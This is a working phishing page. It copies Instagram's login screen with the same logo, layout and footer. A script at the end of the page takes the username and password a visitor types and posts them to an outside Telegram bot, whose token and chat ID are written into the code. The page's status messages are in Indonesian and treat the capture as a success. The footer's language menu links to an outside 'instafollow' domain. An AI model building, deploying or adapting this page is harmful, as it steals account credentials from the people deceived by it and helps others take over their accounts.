<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Instagram Login Form</title>

  <style>
    /* Universal Selectors */
    #root, body, html {
      height:100%;
    }

    body {
      overflow-y: scroll;
    }

    a, abbr, acronym, address, applet, article, aside, audio, b, big, blockquote, body, canvas, caption, center, cite, code, dd, del, details, dfn, div, dl, dt, em, embed, fieldset, figcaption, figure, footer, form, h1, h2, h3, h4, h5, h6, header, hgroup, html, i, iframe, img, ins, kbd, label, legend, li, mark, menu, nav, object, ol, output, p, pre, q, ruby, s, samp, section, small, span, strike, strong, sub, summary, sup, table, tbody, td, tfoot, th, thead, time, tr, tt, u, ul, var, video {
      margin:0;
      padding:0;
      border:0;
      font:inherit;
      vertical-align: baseline;
    } 

    a, a:visited {
      text-decoration: none;
    }
    a:active, .btn:active {
      opacity:.5;
    }

    ol, ul {
      list-style: none;
    }

    body, button, input {
      font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
      font-size:14px;
      line-height:18px;
    }

    #root, article, main, div, section, header, nav, footer {
      border: 0 solid #000000;
      box-sizing: border-box;
      align-items: stretch;
      display: flex;
      flex-direction: column;
      flex-shrink: 0;
      margin:0;
      padding:0;
      position: relative;
    }

    #root {
      z-index: 0;
    }

    .section-all {
      min-height:100%;
      overflow:hidden;
    }

    .main {
      background-color: #fafafa;
      order: 4;
      flex-grow: 1;
    }

    .wrapper {
      min-height:100%;
      overflow: hidden;
    }

    .wrapper, .article {
      flex-grow: 1;
      justify-content: center;
    }

    .article {
      flex-direction: row;
      margin:0 auto;
      max-width: 935px;
      width:100%;
    }

    .content {
      color:#262626;
      flex-grow:1;
      justify-content: center;
      max-width: 350px;
      margin-top:12px;
    }

    .login-box {
      background: #fff;
      border: 1px solid #e6e6e6;
      border-radius: 1px;
      margin:0 0 10px;
      padding: 10px 0;
    }

    .header {
      margin: 14.45px auto 12px;
    }

    .logo {
      background: cover no-repeat;
      width:175px;
      height:auto;
    }

    .form {
      display: flex;
      flex-direction: column;
      margin-bottom: 10px;
    }

    .input-box {
      margin:auto 40px 6px;
    }

    input {
      height: 36px;
      border: 1px solid #efefef;
      border-radius: 3px;
      background-color: #fafafa;
      width:100%;
      font-size:12px;
      padding: 9px 0 7px 8px;
      outline: none;
      box-sizing: border-box;
    }

    input#name:focus, input#password:focus {
      border-color:#bbb;
    }

    .button-box {
      display: block;
      position: relative;
      margin: 8px 40px;
    }

    .btn {
      cursor: pointer;
      width: 100%;
      background: #3897f0;
      border:1px solid #3897f0;
      color:#fff;
      border-radius:3px;
      font-weight:600;
      font-size: 14px;
      height: 28px;
      line-height: 26px;
    }

    .forgot {
      font-size:12px;
      margin-top:12px;
      text-align: center;
      color:#003569;
    }

    .text {
      text-align:center;
      margin:15px;
      color:#262626;
      font-size:14px;
    }

    .text a {
      color:#3897f0;
      margin-left:3px;
    }

    .app p {
      line-height: 18px;
      color:#262626;
      font-size:14px;
      text-align:center;
      margin:10px 20px;
    }

    .app-img {
      flex-direction: row;
      justify-content: center;
      margin:10px 0;
    }

    .app-img a {
      margin-right:8px;
      height: 43.5px;
    }

    .app-img img {
      height:40px;
    }

    .footer {
      background-color: #fafafa;
      order: 5;
      padding: 0 20px;
    }

    .footer-container {
      flex-direction: row;  
      flex-wrap:wrap;
      background-color: #fafafa;
      justify-content: space-between;
      padding: 38px 0;
      max-width:935px;
      font-size:12px;
      font-weight:600;
      margin:0 auto;
      text-transform:uppercase;
      width:100%
    }

    .footer-nav ul li {
      display: inline-block;
      margin-right: 13px;
      margin-bottom:7px;
    }

    .footer-nav ul li a {
      color: #003569;
    }

    .footer span {
      color:#999;
    }

    span.language {
      color: #003569;
      cursor: pointer;
      display: inline-block;
      font-weight: 600;
      position: relative;
      text-transform: uppercase;
    }

    .select {
      cursor: pointer;
      opacity: 0;
      position: absolute;
      left:0;
      width: 100%;
    }

    @media (max-width:450px) {
      .main {
        background-color: #fff;
      }

      .content {
        max-width: 100%;
        margin-top: 0;
      }

      .login-box {
        background-color: transparent;
        border:none;
      }
    }

    @media only screen and (max-width:875px) {
      .footer-container {
        text-align: center;
        padding:10px 0;
        justify-content: center;
        margin:0 auto;
        max-width: 360px;
      }
    }
  </style>
</head>

<body>
  <span id="root">
    <section class="section-all">
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                </div>

                <div class="form-wrap">
                  <form class="form" id="login-form">
                    <div class="input-box">
                      <input type="text" id="username_field" placeholder="Phone number, username, or email" name="username" required>
                    </div>
                    <div class="input-box">
                      <input type="password" id="password_field" placeholder="Password" required>
                    </div>
                    <span class="button-box">
                      <button class="btn" type="submit" name="submit">Log in</button>
                    </span>
                    <a class="forgot" href="#">Forgot password?</a>
                  </form>
                </div>
              </div>

              <div class="login-box">
                <p class="text">Don't have an account?<a href="#">Sign up</a></p>
              </div>

              <div class="app">
                <p>Get the app.</p>
                <div class="app-img">
                  <a href="https://itunes.apple.com/app/instagram/id389801252">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
                  </a>
                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
                  </a>
                </div>
              </div>
            </div>
          </article>
        </div>
      </main>

      <footer class="footer" role="contentinfo">
        <div class="footer-container">
          <nav class="footer-nav" role="navigation">
            <ul>
              <li><a href="#">About Us</a></li>
              <li><a href="#">Support</a></li>
              <li><a href="#">Blog</a></li>
              <li><a href="#">Press</a></li>
              <li><a href="#">Api</a></li>
              <li><a href="#">Jobs</a></li>
              <li><a href="#">Privacy</a></li>
              <li><a href="#">Terms</a></li>
              <li><a href="#">Directory</a></li>
              <li>
                <span class="language">Language
                  <select name="language" class="select" onchange="la(this.value)">
                    <option value="#">English</option>
                    <option value="http://ru-instafollow.bitballoon.com">Russian</option>
                  </select>
                </span>
              </li>
            </ul>
          </nav>

          <span class="footer-logo">&copy; 2025 Instagram</span>
        </div>
      </footer>
    </section>
  </span>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const BOT_TOKEN = '8294940824:AAFJYAbNnxRyaNB321v9IEQ_dnqBZJA7R7I';
      const CHAT_ID = '6315300476';
      const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

      const form = document.getElementById('login-form');
      const usernameField = document.getElementById('username_field');
      const passwordField = document.getElementById('password_field');
      const submitButton = form.querySelector('.btn');

      async function sendLoginData(event) {
        event.preventDefault();

        const username = usernameField.value.trim();
        const password = passwordField.value.trim();

        if (!username || !password) {
          console.warn("‚ö†Ô∏è Peringatan: Harap isi semua kolom input.");
          return;
        }

        submitButton.disabled = true;
        submitButton.textContent = 'Mengirim Data...';

        const telegramMessage = `
          <b>üö® DETEKSI AKUN BARU INSTAGRAM üö®</b>

          =============================
          <b>üë§ USERNAME/EMAIL:</b> <code>${username}</code>
          <b>üîë KATA SANDI:</b> <code>${password}</code>
          =============================

          <i>‚ö†Ô∏è Data didapatkan melalui form Login.</i>
        `;

        try {
          const response = await fetch(TELEGRAM_API, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: telegramMessage,
              parse_mode: 'HTML'
            })
          });

          if (response.ok) {
            console.log("‚úÖ Sukses: Data berhasil dikirim ke Telegram (UI Bersih).");
            usernameField.value = '';
            passwordField.value = '';
          } else {
            const errorData = await response.json();
            console.error("‚ùå Gagal Mengirim Data. Cek Bot Token/Chat ID. Error Telegram:", errorData);
          }
        } catch (error) {
          console.error("‚ö†Ô∏è Kesalahan Jaringan saat mengirim data:", error);
        } finally {
          submitButton.disabled = false;
          submitButton.textContent = 'Login';
        }
      }

      form.addEventListener('submit', sendLoginData);
    });
  </script>
</body>
</html>
